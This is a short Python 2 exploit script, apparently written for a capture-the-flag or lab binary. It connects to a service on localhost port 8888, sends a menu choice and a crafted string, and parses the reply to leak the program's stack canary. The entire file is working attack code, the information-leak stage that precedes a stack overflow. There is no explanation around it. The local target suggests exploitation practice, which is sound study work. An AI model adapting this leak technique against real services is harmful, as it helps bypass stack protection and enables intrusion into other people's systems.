import time
from socket import *
from struct import *
import hexdump
p = lambda x :pack("<L",x)
up = lambda x:unpack("<L", x)[0]

s = socket(AF_INET, SOCK_STREAM)
s.connect(('localhost', 8888))

print "[+] START !!"

s.recv(4096)
time.sleep(3)
s.recv(4096)

s.send('4\n')
time.sleep(1)
print "[+] Canary Leak !!"

s.recv(1024)
s.send('y'*1+ "a"*10)

canary = s.recv(1024)
canary = "\x00"+canary.split("y"+"a"*10)[1][:3]
print "[+] Canary = " + str(hex(up(canary)))
s.close()